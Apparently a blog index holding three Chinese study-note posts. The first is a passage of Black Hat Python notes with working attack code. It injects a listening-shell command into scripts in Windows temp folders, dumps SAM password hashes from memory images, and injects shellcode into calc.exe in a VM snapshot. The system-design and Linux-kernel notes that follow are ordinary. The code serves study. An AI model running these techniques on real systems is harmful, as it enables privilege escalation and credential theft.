new_process.ParentProcessId        privileges = get_process_privileges(pid)        process_log_message = &quot;%s,%s,%s,%s,%s,%s,%s&quot; % (            create_date, proc_owner, executable, cmdline, pid, parent_pid,            privileges)        print(&quot;%s\\r\\n&quot; % process_log_message)        log_to_file(process_log_message)    except:        pass\n把所有新產生的process的權限列出來\n這邊使用的是windows WMI API\n這邊有一些有趣的權限，但就不列出詳細的作用(懶)\n\nSeBackupPrivilege\nSeDebugPrivilege\nSeLoadDriver\n\n\nfile_monitor.py\n# Modified example that is originally given here:# http://timgolden.me.uk/python/win32_how_do_i/watch_directory_for_changes.htmlimport tempfileimport threadingimport win32fileimport win32conimport os# these are the common temp file directoriesdirs_to_monitor = [&quot;C:\\\\WINDOWS\\\\Temp&quot;, tempfile.gettempdir()]# file modification constantsFILE_CREATED = 1FILE_DELETED = 2FILE_MODIFIED = 3FILE_RENAMED_FROM = 4FILE_RENAMED_TO = 5# extension based code snippets to injectfile_types = &#123;&#125;command = &quot;C:\\\\WINDOWS\\\\TEMP\\\\bhpnet.exe –l –p 9999 –c&quot;file_types[&#x27;.vbs&#x27;] = [&quot;\\r\\n&#x27;bhpmarker\\r\\n&quot;,                      &quot;\\r\\nCreateObject(\\&quot;Wscript.Shell\\&quot;).Run(\\&quot;%s\\&quot;)\\r\\n&quot;                      % command]file_types[&#x27;.bat&#x27;] = [&quot;\\r\\nREM bhpmarker\\r\\n&quot;, &quot;\\r\\n%s\\r\\n&quot; % command]file_types[&#x27;.ps1&#x27;] = [&quot;\\r\\n#bhpmarker&quot;, &quot;Start-Process \\&quot;%s\\&quot;&quot; % command]def inject_code(full_filename, extension, contents):    # is our marker already in the file?    if file_types[extension][0] in contents:        return    # no marker let&#x27;s inject the marker and code    full_contents = file_types[extension][0]    full_contents += file_types[extension][1]    full_contents += contents    fd = open(full_filename, &quot;wb&quot;)    fd.write(full_contents.encode())    fd.close()    print(&quot;[\\o/] Injected code.&quot;)    returndef start_monitor(path_to_watch):    # we create a thread for each monitoring run    file_list_directory = 0x0001    h_directory = win32file.CreateFile(        path_to_watch,        file_list_directory,        win32con.FILE_SHARE_READ        | win32con.FILE_SHARE_WRITE        | win32con.FILE_SHARE_DELETE,        None,        win32con.OPEN_EXISTING,        win32con.FILE_FLAG_BACKUP_SEMANTICS,        None)    while 1:        try:            results = win32file.ReadDirectoryChangesW(                h_directory,                1024,                True,                win32con.FILE_NOTIFY_CHANGE_FILE_NAME |                win32con.FILE_NOTIFY_CHANGE_DIR_NAME |                win32con.FILE_NOTIFY_CHANGE_ATTRIBUTES |                win32con.FILE_NOTIFY_CHANGE_SIZE |                win32con.FILE_NOTIFY_CHANGE_LAST_WRITE |                win32con.FILE_NOTIFY_CHANGE_SECURITY,                None,                None            )            for action, file_name in results:                full_filename = os.path.join(path_to_watch, file_name)                if action == FILE_CREATED:                    print(&quot;[ + ] Created %s&quot; % full_filename)                elif action == FILE_DELETED:                    print(&quot;[ - ] Deleted %s&quot; % full_filename)                elif action == FILE_MODIFIED:                    print(&quot;[ * ] Modified %s&quot; % full_filename)                    # dump out the file contents                    print(&quot;[vvv] Dumping contents...&quot;)                    try:                        fd = open(full_filename, &quot;rb&quot;)                        contents = fd.read()                        fd.close()                        print(contents)                        print(&quot;[^^^] Dump complete.&quot;)                        filename, extension = os.path.splitext(full_filename)                        if extension in file_types:                            inject_code(full_filename, extension, contents)                    except:                        print(&quot;[!!!] Failed.&quot;)                elif action == FILE_RENAMED_FROM:                    print(&quot;[ &gt; ] Renamed from: %s&quot; % full_filename)                elif action == FILE_RENAMED_TO:                    print(&quot;[ &lt; ] Renamed to: %s&quot; % full_filename)                else:                    print(&quot;[???] Unknown: %s&quot; % full_filename)        except:            passfor path in dirs_to_monitor:    monitor_thread = threading.Thread(target=start_monitor, args=(path,))    print(&quot;Spawning monitoring thread for path: %s&quot; % path)    monitor_thread.start()\n當script file被改的時候，插入我們的code\nCH11\n示範Volatility的使用\n這裡是利用Volatility針對惡意程式分析的tutorial\ngrabhashes.py\nimport sysimport volatility.conf as confimport volatility.registry as registryimport volatility.commands as commandsimport volatility.addrspace as addrspacefrom volatility.plugins.registry.registryapi import RegistryApifrom volatility.plugins.registry.lsadump import HashDumpmemory_file = &quot;WinXPSP2.vmem&quot;sys.path.append(&quot;/Downloads/volatility-2.3.1&quot;)registry.PluginImporter()config = conf.ConfObject()config.parse_options()config.PROFILE = &quot;WinXPSP2x86&quot;config.LOCATION = &quot;file://%s&quot; % memory_fileregistry.register_global_options(config, commands.Command)registry.register_global_options(config, addrspace.BaseAddressSpace)registry = RegistryApi(config)registry.populate_offsets()sam_offset = Nonesys_offset = Nonefor offset in registry.all_offsets:    if registry.all_offsets[offset].endswith(&quot;\\\\SAM&quot;):        sam_offset = offset        print(&quot;[*] SAM: 0x%08x&quot; % offset)    if registry.all_offsets[offset].endswith(&quot;\\\\system&quot;):        sys_offset = offset        print(&quot;[*] System: 0x%08x&quot; % offset)    if sam_offset is not None and sys_offset is not None:        config.sys_offset = sys_offset        config.sam_offset = sam_offset        hashdump = HashDump(config)        for hash in hashdump.calculate():            print(hash)        breakif sam_offset is None or sys_offset is None:    print(&quot;[*] Failed to find the system or SAM offsets.&quot;)\nwindows的本機密碼放在SAM registry hive\n開機金鑰放在system registry hive\n用指令會是\npython vol.py imageinfo -f &quot;memdump.img&quot; # get suggested profilepython vol.py hivelist --profile=&quot;WinXPSP2x86&quot; -f &quot;memdump.vmem&quot;# Virual Physical Name# ------ -------- ----# ...# abc    def      \\Device\\HarddiskVolume1\\WINDOWS\\system32\\config\\SAM# ghi    jkl      \\Device\\HarddiskVolume1\\WINDOWS\\system32\\config\\system# ...python vol.py hashdump --profile=&quot;WinXPSP2x86&quot; -f &quot;memdump.vmem&quot; -y ghi -s abc\n\ncodecoverage.py\nfrom immlib import *class CcHook(LogBpHook):    def __init__(self):        LogBpHook.__init__(self)        self.imm = Debugger()    def run(self, regs):        self.imm.log(&quot;%08x&quot; % regs[&#x27;EIP&#x27;], regs[&#x27;EIP&#x27;])        self.imm.deleteBreakpoint(regs[&#x27;EIP&#x27;])        returndef main(args):    imm = Debugger()    calc = imm.getModule(&quot;calc.exe&quot;)    imm.analyseCode(calc.getCodebase())    functions = imm.getAllFunctions(calc.getCodebase())    hooker = CcHook()    for function in functions:        hooker.add(&quot;%08x&quot; % function, function)    return &quot;Tracking %d functions.&quot; % len(functions)\n這個是為了找出特定function的記憶體位置\n利用Immunity Debugger的breakpoint把記憶體位置在中斷時列出來\n使用方法!code_coverage\n\ncode_inject.py\nimport sysimport structimport volatility.conf as confimport volatility.registry as registryimport volatility.commands as commandsimport volatility.addrspace as addrspaceimport volatility.plugins.taskmods as taskmodsequals_button = 0x01005D51 # from codecoverage.pymemory_file = &quot;/Users/justin/Documents/Virtual Machines.localized/&quot; \\              &quot;Windows Server 2003 Standard Edition.vmwarevm/&quot; \\              &quot;564d9400-1cb2-63d6-722b-4ebe61759abd.vmem&quot;slack_space = Nonetrampoline_offset = None# read in our shellcodesc_fd = open(&quot;cmeasure.bin&quot;, &quot;rb&quot;)sc = sc_fd.read()sc_fd.close()sys.path.append(&quot;/Downloads/volatility-2.3.1&quot;)registry.PluginImporter()config = conf.ConfObject()registry.register_global_options(config, commands.Command)registry.register_global_options(config, addrspace.BaseAddressSpace)config.parse_options()config.PROFILE = &quot;Win2003SP2x86&quot;config.LOCATION = &quot;file://%s&quot; % memory_filep = taskmods.PSList(config) # Print all running processes by following the EPROCESS lists.for process in p.calculate():    if str(process.ImageFileName) == &quot;calc.exe&quot;:        print(&quot;[*] Found calc.exe with PID %d&quot; % process.UniqueProcessId)        print(&quot;[*] Hunting for physical offsets...please wait.&quot;)        address_space = process.get_process_address_space()        pages = address_space.get_available_pages()        for page in pages:            physical = address_space.vtop(page[0]) # page[0]是位置 page[1]是大小            if physical is not None:                if slack_space is None:                    fd = open(memory_file, &quot;r+&quot;)                    fd.seek(physical)                    buf = fd.read(page[1])                    try:                        offset = buf.index(&quot;\\x00&quot; * len(sc))                        slack_space = page[0] + offset                        print(&quot;[*] Found good shellcode location!&quot;)                        print(&quot;[*] Virtual address: 0x%08x&quot; % slack_space)                        print(&quot;[*] Physical address: 0x%08x&quot; % (                                physical + offset))                        print(&quot;[*] Injecting shellcode.&quot;)                        fd.seek(physical + offset)                        fd.write(sc.decode())                        fd.flush()                        # create our trampoline                        tramp = &quot;\\xbb%s&quot; % struct.pack(&quot;&lt;L&quot;, page[0] + offset)                        tramp += &quot;\\xff\\xe3&quot;\t\t\t# mov ebx, ADDR_OF_SHELLCODE\t\t\t# jmp ebx                        if trampoline_offset is not None:                            break                    except:                        pass                    fd.close()                # check for our target code location                if page[0] &lt;= equals_button &lt; ((page[0] + page[1]) - 7):                    # calculate virtual offset                    v_offset = equals_button - page[0]                    # now calculate physical offset                    trampoline_offset = physical + v_offset                    print(&quot;[*] Found our trampoline target at: 0x%08x&quot; % (                        trampoline_offset))                    if slack_space is not None:                        break        print(&quot;[*] Writing trampoline...&quot;)        fd = open(memory_file, &quot;r+&quot;)        fd.seek(trampoline_offset)        fd.write(tramp)        fd.close()        print(&quot;[*] Done injecting code.&quot;)\n這是針對vm的記憶體快照的code injection\n流程如下\n\n找calc.exe\n找適合放的空記憶體的起始位置\n放轉跳的code\n\n","categories":["Python","Reading"]},{"title":"system design primer筆記 工具篇","url":"/2021/01/system-design-primer-note/","content":"動機\n會知道system design primer是因為某場面試，原本以為system design在網路上沒有什麼資料\n結果是很多資料，但是system design資料會多，很大一部分是system design包含的面向很廣\n所以來整理一下，作為了解的開始\n這篇是介紹會用到的工具，接下來是設計\n但設計還要帶一下估計的方法與常用數字\n所以之後還有兩篇要整理\n\n取捨\n\n效能 vs 可擴展性\n\n效能: 服務更多的工作單元，也可以處理更多的資料\n\n性能問題: 對單一使用者來說的感覺是慢的\n\n\n可擴展性: 服務性能的增加和資源的投入是成正比\n\n可擴展性問題: 對於單一使用者來說感覺較快，但在高負載的時候就會變慢\n\n\n\n\n延遲 vs 吞吐量\n\n延遲: 執行一個操作或運算結果所花費的時間\n吞吐量: 單位時間內執行此類型操作或運算的數量\n可接受的延遲數量下的最大化吞吐量 為設計目標\n\n\n可用性 vs 一致性\n\nCAP 理論: 在一個分散式系統中，只能滿足以下三個項目的任兩項\n\n一致性: 每次讀取都可以得到最新的資料，但偶爾會拿到錯誤\n\n弱一致性\n\n在寫入之後，任何的存取不一定可以拿到資料，弱一致性將盡力確保能存取到最新的資料 (錯過就沒了)\n例子: 視訊聊天、藍芽耳機的延遲\n\n\n最終一致性\n\n在寫入後的讀取操作最終可以看到被寫入的資料資料透過非同步的方式被複製\n例子: DNS、NoSQL (需要等一段時間傳播)\n\n\n強一致性\n\n在寫入後，讀取將立刻取得資料，資料是透過同步的方式寫入\n例子: FileSystem、SQL\n\n\n\n\n可用性: 每次讀取都可以得到非錯誤的回應，但不能保證可以得到最新的資料\n\n容錯轉移\n\n主動到備用切換\n\n當 heartbeat 中斷時，備用的機器就會切換為主動機器的 IP 位置接替服務\n只有處於主動的機器會處理使用者來的流量\n\n\n雙主動切換\n\n兩台伺服器都會負責處理流量\n流量會在他們之間進行分散負載\n缺點\n\nload balancer或是服務需要知道這些主動的機器\n\n\n\n\n缺點\n\n增加額外的硬體與複雜度\n如果在新寫入的資料被複製到備用的機器前系統就發生故障，那有可能會遺失資料\n\n\n\n\n複寫\n\n主動到備用複寫(主從複寫)\n\n主資料庫負責讀和寫\n\n將寫入的資料複寫至一或多個從屬資料庫中\n\n\n從屬資料庫只負責讀取\n\n從屬資料庫可以再將寫入複製到更多以樹狀結構的其他資料庫中\n\n\n如果主資料庫離線了\n\n系統可以以只讀模式運行，直到\n\n某個從屬資料庫被提升為主資料庫 OR\n新的主資料庫出現\n\n\n\n\n\n\n雙主動複寫(主動模式複寫)\n\n兩個主要的資料庫都負責讀取和寫入，並且兩者互相協調\n如果主資料庫離線了，系統可以繼續運作\n缺點\n\nload balancer或是服務需要知道這些主動的機器，決定寫入哪台\n大多數無法保證一致性(違反 ACID)\n因同步而產生寫入延遲\n隨著更多寫入節點的增加和延遲的提高，如何解決衝突變複雜\n\n\n\n\n缺點\n\n複製 上的問題\n\n如果在主要資料庫複製到其他結點前系統就失效，則會有資料丟失的可能\n\n\n多讀取節點的問題\n\n當有過多寫入時，讀取的資料庫可能會因為過多寫入操作而被阻塞，導致讀取功能異常\n當讀取的資料庫越多時，需要複寫的資料庫越多，將會導致較為嚴重的延遲\n在某些資料庫系統中，寫入主資料庫的操作可以用多執行緒來並行寫入，但讀取的資料庫只支援單一執行緒來循序寫入\n\n\n複雜度\n\n複寫意味著更多的硬體以及更高的複雜度\n\n\n\n\n\n\n\n\n部分容錯性: 在任意分區的網路故障情況下，系統仍然能夠持續運行\n\n\n網路是不可靠的，你的設計必須要確保部分容錯性，所以你只能夠在一致性與可用性中做出取捨\n\nCP: 一致性與部分容錯性\n\n可能因超時而報錯\n\n\nAP: 可用性與部分容錯性\n\n都拿的到資料，但不一定是最新的 (拿到舊的不是錯誤)\n\n\n\n\n\n\n\n工具\n\nDNS\n\nNS, MX, CNAME, A record\nload balance\n\nWeighted round robin\n基於延遲分流\n基於地理位置分流\n\n\n缺點\n\nDNS的query會有延遲\nDNS管理複雜\n會被DDOS\n\n\n\n\nCDN\n\n推送式 CDNs (callback)\n\n當你的伺服器有檔案變動時，推送 CDN 會接收到新的變動內容\n流量較小的網站，或是內容不是經常更新的網站使用推送式的 CDN 相當適合\n可以設定檔案內容什麼時候過期以及何時更新，檔案內容只有在變更或新增的時候才會推送，最小化流量，但最大化儲存\n\n\n拉取式 CDNs (on-demand)\n\n當地一個使用者來請求該資源時，才從伺服器上抓取對應檔案\n拉取式 CDN 可以節省儲存空間\n在過期的文件被更新之前，則會導致多餘的流量\n拉取式的 CDN 適合高流量的網站，因為檔案會被平均的分散在各個結點伺服器中\n\n\n缺點\n\nCDN 的成本取決於流量，可能會因為成本而放棄使用\n如果在 TTL 過期之前就更新內容，CDN 的緩存內容可能會過期\n需要改變靜態內容的網址來指向 CDN\n\n\n\n\nload balancer\n\n分配方式\n\n隨機\n最少負載\nSession/cookies\nWeighted round robin\n第四層負載平衡\n\n第四層的負載平衡器會監看 傳輸層 的資訊來決定如何分發請求 (5 tuple)\n透過 網路地址轉換(NAT) 來向上游的伺服器轉發資料\n\n\n第七層負載平衡\n\n第七層的負載平衡器會監看 應用層 來決定如何分發請求這包含了請求的 header、訊息和 cookies (DPI)\n第四層的負載平衡比起第七層的所要花費的時間和計算資源更低\n\n\n水平擴展\n\n缺點\n\n水平擴展會增加複雜性，同時也涉及了多台伺服器的議題\n快取伺服器或資料庫需要隨著伺服器的增加而進行擴展，以便處理更多的請求\n\n\n\n\n\n\n好處\n\nSSL Termination: 將傳入的請求解密，並且加密伺服器的回應\nSession 保存: 發行 cookie，並將特定使用者的請求路由到同樣的後端伺服器上\n\n\n缺點\n\n當負載平衡器資源不夠或沒有正確設定時，他可能會成為效能的瓶頸\n會增加架構的複雜性\n只有一台負載平衡器時，一樣有單點失敗的問題\n\n\n\n\nreversed proxy\n\n好處\n\n隱藏後端伺服器的資訊、可以設定 IP 的黑名單、限制每個客戶端的連線數量等\n增加可擴展性與靈活性 - 客戶端只會看到反向代理伺服器的 IP 或域名\nSSL 終止 - 解密傳入的請求、加密伺服器的回應，這樣後端伺服器就不需要進行這些高成本的操作\n壓縮 - 壓縮伺服器的回應\n快取 - 直接在代理伺服器回應命中快取的結果\n\n\n缺點\n\n引入反向代理伺服器會增加系統複雜度\n只有一台反向代理伺服器會有單點失效的問題，而設定多台的反向代理伺服器(如 故障轉移 )同樣會增加系統複雜度\n\n\n負載平衡器與反向代理\n\n當有多台伺服器時，使用負載平衡非常有用，一般來說，負載平衡器會將流量路由給一組功能相同的伺服器上\n即使只有一台伺服器或應用伺服器，反向代理也是有用的\n\n\n\n\ncontainer orchestration platform\n\n微服務\n\n可以獨立運作、小型的模組化服務每個服務會透過明確定義好的輕量級溝通機制，運作在一個獨立的流程中來共同實現一個目標\n\n\n服務發現\n\n透過註冊的名稱、位置、Port 等資訊來幫助各個服務發現彼此\nHealth checks 可以幫助確認服務的完整性以及是否經常使用一個 HTTP 的路徑\n\n\n缺點\n\n設計多個鬆耦合微服務所組成的應用層，必須從架構、維運、流程等多個面向來考量，相對於單系統而言會非常不同\n微服務會增加部署與維運的複雜度\n\n\n\n\nDB\n\nRDBMS(SQL)\n\n特性: ACID\n\n原子性 - 每一個資料庫事務操作要不就是全部完成，要不就是全部不完成\n一致性 - 任何一個資料庫事務操作都會讓資料庫從一個有效的狀態轉換到另外一個有效狀態\n隔離性 - 併發執行資料庫事務操作的結果會和循序執行的結果一致\n持久性 - 一旦一個事務被資料庫執行後，他的結果與影響是擁永久保存的\n\n\n複寫\n\n見 CAP中的可用性的複寫\n\n\nfederative database\n\n將資料庫按照對應的功能進行分割\n好處\n\n減少每個資料庫寫入與讀取的流量，進而降低複製的延遲\n較少的資料意味者更多適合放入記憶體中的資料，進而增加快取命中率\n因為沒有循序寫入的中央式主資料庫，你可以並行寫入以增加吞吐量\n\n\n缺點\n\n如果你的資料表需要大量的功能和資料表，聯邦式資料庫的效率並不好\n需要更新應用程式的邏輯來決定如何讀取和寫入到哪個資料庫\n透過 server link 從兩個資料庫中關資料更加複雜\n聯邦式資料庫需要更多的硬體和額外的複雜度\n\n\n\n\nSharding\n\n將資料分配在不同的資料庫上，使每個資料庫只管理整個資料的部分子集\n好處\n\n可以減少讀取和寫入的流量、減少複製並提高快取命中率\n索引的容量也會減少，如此一來可以改善查詢的效能\n當一個分片出現問題時，其餘的仍然可以正常運作\n分片的機制並沒有中央式的資料庫，你可以並行寫入以增加吞吐量\n\n\n缺點\n\n為了避免資料遺失，你可能需要思考其他複寫的機制\n你需要修改應用程式的邏輯來實作分片，這可能會導致 SQL 變得複雜\n不合理的分片可能會導致資料負載不均\n從多個分片中操作資料會很複雜\n分片需要額外的硬體和複雜度\n\n\n\n\nDenormalization\n\n不同資料表中的重複資料來避免高成本的 Join 操作\n好處\n\n反正規化可以避免，如處理跨資料中心 Join 操作\n\n\n\n\n資料會重複存取\nConstraints 的機制可以讓重複的資料保持同步，但這樣會增加資料庫設計的複雜度\n反正規化的資料庫在大量寫入負載的情況下，性能表現可能會比正規化的資料庫差\n\n\n\n\nSQL Tuning\n\nimprove schema\nuse properly index\n\nindex特性\n\n設定索引時，會將資料放置於記憶體中，會佔用更多記憶體空間\n索引通常是使用平衡 B 樹 表示，這樣可以保證資料是有序的，並允許在對數時間內進行搜尋、循序訪問以及插入、刪除等操作\n\n\nSELECT, GROUP BY, ORDER BY, JOIN 中使用有index的欄位，來加速查詢\n缺點\n\n寫入操作會變慢，因為索引會需要更新\n\n當讀取大量資料時，禁用索引再讀取，之後再重新建立索引\n\n\n\n\n\n\nsplit table\n\n將熱門的資料拆分到單獨的資料表中可以增加快取\n\n\navoid complex joining\n\n反正規化\n\n\n\n\n\n\nNoSQL\n\n特性: BASE\n\nBasicly Avalibility: 系統保證可用性\nSoft state: 系統的狀態可能隨著時間改變，即使在沒有輸入的情況下也是如此\neventually consistent - 經過一段時間之後，在沒有收到任何輸入的情況下，系統最終會達到一致\n\n\n鍵-值對 (hash table)\n\n通常用來儲存簡單的資料模型或是頻繁修改的資料\n\n\n文件類型 (文件當做值的value的hash table)\n\n文件類型的資料庫具備高度靈活性(不會看到一堆NULL)，通常用於處理偶爾變化的資料\n\n\n列儲存型 (巢狀的 Map ColumnFamily&lt;RowKey, Columns&lt;ColKey, Value, Timestamp&gt;&gt;)\n\n原本是一個ID得到 row(&lt;item1, item2, ...&gt;)\n現在是一個item對到一個ID，可以當成把table依column切開\n列儲存型態的資料的提供了高可用和高擴展性，通常被用在大量資料的儲存上\n\n\n圖形 (圖)\n\n圖形資料庫針對表示外來鍵(Foreign Key)眾多的複雜關聯或多對多關聯進行優化\n圖形資料庫為了儲存複雜的資料結構，例如社群網路，提供了很高的性能\n\n\n\n\nSQL 或 NoSQL\n\nSQL\n\n結構化資料、嚴格的 schema\n需要複雜的 join\ntransaction\n既有資源豐富\n有index\n\n\nNoSQL\n\n半結構化資料、動態或具有彈性的 schema\n不需要複雜的 joins\n儲存 TB (或 PB) 等級的資料\n高資料密集量的工作負載\nIOPS 的高吞吐量\n適合使用 NoSQL\n\n暫時性的資料\n經常頻繁存取的資料\n\n\n\n\n\n\n\n\n\n快取\n資料庫在資料均勻分布的情況下，讀取和寫入的效能是最好的\n但是熱門的資料會讓讀取分佈不均，如此一來就會造成效能瓶頸\n在資料庫前增加一個快取，就可以減少負載不均和突發流量所造成的影響\n\n客戶端 (作業系統或瀏覽器)\nCDN\nDB\n應用程式 (基於記憶體的快取，像是 Memcached 和 Redis)\n\n快取的級別\n\n資料庫查詢\n\n記錄級別\n查詢級別\n注意\n\n當你的查詢很複雜時，很難刪除快取內容\n如果某個資料表中的某個欄位值改變時，需要刪除所有可能包含該欄位值的快取結果\n\n\n\n\n物件 (應該避免文件檔案的快取，因為這會讓複製和自動擴展變得困難)\n\n完整的可序列化物件\n完整的 HTML\n注意\n\n如果物件內的基本資料已經改變，那應該要從快取中刪除這個物件\n允許異步處理：workers 透過使用最新的快取來組裝物件\n\n\n建議快取的資料\n\n使用者 sessions\n完整渲染的頁面\n活動資訊\n使用者資料圖表\n\n\n\n\n\n\n\n\n快取策略\n\nWrite around\n\n應用程式負責從儲存裝置中進行讀取及寫入快取不直接和儲存裝置進行互動\n過程\n\n讀快取、拉資料、寫到快取 (讀的都一樣，下面就pass)\n直接寫到DB\n\n\n缺點\n\n當請求的資料不在快取中時，就需要經過三個步驟來獲得資料，這會導致明顯的延遲\n如果資料庫中的資料被更新了，會導致快取中的資料過時，這需要透過設定 TTL 強制更新快取，或透過Write through來解決這種問題\n當快取的某個節點發生故障時，會需要被一個新的節點取代，這會導致延遲\n\n\n\n\nWrite through\n\n應用程式使用快取當作主要的資料儲存服務，將資料寫入/讀取到快取中，由快取服務負責向資料庫讀寫資料\n過程\n\n寫快取、寫到資料庫\n\n\n缺點\n\n當發生故障或因為水平擴展而產生新的節點時，新的節點中將不會有快取資料，直到資料庫更新為止\n\n快取模式和寫入模式一起使用可以減緩這種現象\n\n\n被寫入多數的資料可能永遠都不會被讀取\n\n可以設定 TTL 來解決這種問題\n\n\n\n\n\n\nWrite back\n\n應用程式使用快取當作主要的資料儲存服務，將資料寫入/讀取到快取中，由快取服務負責向資料庫*-非同步的*-讀寫資料\n過程\n\n寫快取、寫到Queue、return、(等一下)寫到DB\n\n\n缺點\n\n快取可能在資料成功寫入到儲存單元前就丟失\n事後寫入比起快取模式或是直寫模式在實作上更為複雜\n\n\n\n\n更新式快取\n\n將快取設定為在到期之前就自動更新為最新存取的內容 (由server推資料)\n過程\n\nserver寫到快取、等client讀\n\n\n缺點\n\n無法準確預測未來會使用的資料時，會導致性能降低，還不如使用其他模式\n\n\n\n\n\n\n缺點\n\n需要保持快取和資料庫之間資料的一致性，比如說要如何設定 快取無效\n需要更改應用程式程式碼來支援像是 Redis 或 Memcached 等快取服務\n快取的無效性是個難題，而什麼時候要更新快取就是個對應的複雜問題\n\n\n\n非同步機制\n\n訊息佇列\n\n訊息佇列用來接收、保留以及傳遞訊息\n使用者不會被阻塞，同時工作會在背景完成\n\n\nBackpressure\n\n當佇列開始明顯成長時，佇列的大小可能會超過記憶體，這會導致無法命中快取\n背壓 可以用來限制佇列的大小，讓佇列保持高吞吐率和良好的回應時間\n一旦佇列滿了，客戶端將會得到 HTTP 503 的回應碼，以便讓他們在稍後重新嘗試\n\n\n缺點\n\n簡單的運算和需要即時的工作可能更適合使用同步運算，導入佇列可能會增加延遲或系統複雜度\n訊息可能不會照發送順序完成\n\n想想TCP為什麼需要ACK\n\n\n同樣的訊息被重複處理\n\n通常訊息佇列會讓處理失敗的訊息重新入列 (扣款?)\n\n\n\n\n\nRef\nsource\n","categories":["System","System Design"]},{"title":"Linux Kernel Development 3rd筆記","url":"/2021/06/Linux-Kernel-Development-3rd-note/","content":"動機\n不記實際上怎麼跑與跑了什麼，只記設計與方便未來查詢的部分\n畢竟這是基於linux2.6的\n\n整體心得\n讀完上一本工作原理來讀這本剛好，可以互補\n推薦讀\n中斷: ch7~10\nmem: ch12&amp;ch15\n省略掉\nch1, 14, 20\n簡體版的翻譯錯誤有點多要小心，覺得怪就去看原文\nch1\nskip\nch2\nfolder\n\n\n\nfolder\ndescrition\n\n\n\n\narch\nx86, amd64之類的\n\n\nblock\nblock device 的 IO層\n\n\ncrypto\n加密API\n\n\nDocumentation\n文件\n\n\ndrivers\ndevice driver\n\n\nfirmware\ndriver需要的fw\n\n\nfs\nfile system\n\n\ninclude\nkernel的header file\n\n\ninit\nkernel引導與初始化\n\n\nipc\n跨proc溝通\n\n\nkernel\n核心的kernel code(sched之類的)\n\n\nlib\n通用kernel function\n\n\nmm\n記憶體管理與virtual memory\n\n\nnet\n網路\n\n\nsamples\n範例\n\n\nscripts\ncompile kernel用的腳本\n\n\nsecurity\n安全模組\n\n\nsound\n聲音\n\n\nusr\nuserspace的code\n\n\ntools\nlinux的開發工具\n\n\nvirt\n虛擬化\n\n\n\nmake\n\nmake menuconfig\n\n調linux的設定\n\n\nmake defconfig\n\n把menuconfig的設定設成預設\n\n\nmake oldconfig\n\nload從其他地方來的.config\n\n\nmake\n\ncompile\n在kernel code的根目錄會產生System.map，裡面有symbol，需要可以看\n\n\n\nkernel dev的特點\n\n沒有libc與stdlib\n\nlinux有自己的工具，可以看include裡面的header，像/inlucde/linux就是linux kernel的函數\n\n\n用gnu c\n\ninline\nasmembly 內嵌\nlikely, unlikely之類的if優化\n\n\n沒有mem保護\n\n沒有seg fault，只剩panic\n\n\n幾乎不能用floating point\nkernel stack十分小，並隨arch不同而有改變\n同步很重要\n\npreempt\nsmp(多對稱處理器，多cpu)\n\n\n\nch3\nproc\n相關struct\n\nstruct task_struct\n\n在&lt;linux/sched.h&gt;\nproc的DS，有\n\npid\naddr space\n打開的文件 等…\n\n\n\n\nstruct thraed_info\n\n在&lt;asm/thraed_info.h&gt;\n放在kernel stack上，用以找到task_struct\n\n為什麼不直接放task_struct\n\n\n放proc中與arch有關的訊息\n\n可以想成goroutines的struct P\n\n\n\n\n\nproc state\n\n正在跑、可以跑\n\nTASK_RUNNING\n\n\n睡\n\nTASK_INTERRUPTABLE\n\n等interrupt或其他或signal\n\n\nTASK_UNINTERRUPTABLE\n\n不管signal，其他與TASK_INTERRUPTABLE一樣\n\n\n\n\n\nclone syscall\n\nfork\n\nclone(SIGCHID, 0)\n\n\nkthread\n\nclone(CLONE_VM | CLONE_FS | CLONE_FILES | CLONE_SIGHAND, 0)\n\nVM: virtual mem\nFS: file system\nFILES: opend files\nSIGHAND: signal handler\n\n\n\n\nvfork (會sync執行的fork)\n\nclone(CLONE_VFORK | CLONE_VM | SIGCHID, 0)\n\n\n\nch4\nproc scheduler\nproc吃?\n\nIO\n\nscheduler應該要多拉吃IO的proc\n\n不然response time會變慢\n\n\n但throughput會低\n\n\ncpu\n\nscheduler應該多拉吃cpu的proc\n\n不然throughput會變慢\n\n\n但response time會變慢\n\n\n\ntime slice\n\n一個proc能佔cpu多少時間\n\n太長\n\n對吃cpu有利\n對吃IO不利\n高throughput\n差response time\ncxt switch的總計花費時間小\n\n\n太短\n\n對吃cpu不利\n對吃IO有利\n低throughput\n好response time\ncxt switch的總計花費時間多\n\n\n\n\n\nproc優先級\n\nnice\n\n-20~19\n越小越優先\n\n\nreal-time priority\n\n0~99\n越大越優先\nRT proc永遠優先於普通proc\n\n\n兩個是各自獨立的系統\n\n公平調度(CFS)\n\n概念\n\n依據cpu的使用比例分配\n\n分配到的時間與系統負載密切相關\n\n\n搶的時機是如果有proc花的使用比比當前proc少，就換上去\n每個proc預設拿到1/n個cpu時間\n\nn是proc個數\n就是想像一共有proc個數 個cpu\ncpu時間在書中叫目標延遲\n\n\nnice就是原本的1/n再乘上nice換出來的比值\n\n\n實作\n\n計時\n\n在&lt;linux/sched.h&gt;\nstruct_sched_entity\n\nvruntime\n\n會記錄運行時間\n以及以proc總數做標準化\n\n\n\n\n\n\nchoose proc\n\n挑vruntime最小的\n\n\nsched的interface\n\nschedule()\n\n如果要睡覺\n\n就是設定proc state再call這個\n假喚醒\n\n如果state是TASK_INTERRUPTABLE就會被signal叫醒\n所以要檢查喚醒後發生什麼事\n\n\n\n\n\n\n\n\n\n\ncxt switch\n\n在&lt;asm/mmu_context.h&gt;\n\nswitch_mm換virtual mem\n\n\n在&lt;asm/system.h&gt;\n\nswitch_to換cpu state\n\n\n\n\npreempt\n\n用一個flag，need_resched去看該不該被搶\n誰可以設?\n\nscheduler\nproc自己\n\n\npreempt發生時機\n\nuser preempt\n\n從syscall回到userspace\n從中斷處理程序回到userspace\n\n\nkernel preempt\n\n中斷處理程序結束，且回到kernel space之前\nkernel的code再一次可以被搶的時候\n\nneed_resched被設\npreempt_count是0 (在thread_info)\n\n\nkernel的code被block時\nkernel的code調用schedule()\n\n\n\n\n\n\nRT schedule\n\nSCHED_FIFO\n\nproc一直跑，除非\n\nblock\n自己想換\n\n\n\n\nSCHED_RR\n\n有time slice的SCHED_FIFO\n低優先無法搶高優先即使對方的time slice花完了\n\n\n都是soft rt\n\n\n\nch5\nsyscall在上一篇筆記就說了，所以這裡focus在一些之前沒提到的東西\n\nasmlinkage\n\n叫compiler只能從stack拿參數\n\n\n參數驗證\n\nptr的addr是userspace的addr\nptr的addr在proc的addr space中\n讀寫要符合原本的讀寫限制\n參數有效\n\npid有效\n檔案有效\n\n\n\n\nprocess context\n\nsyscall是在process 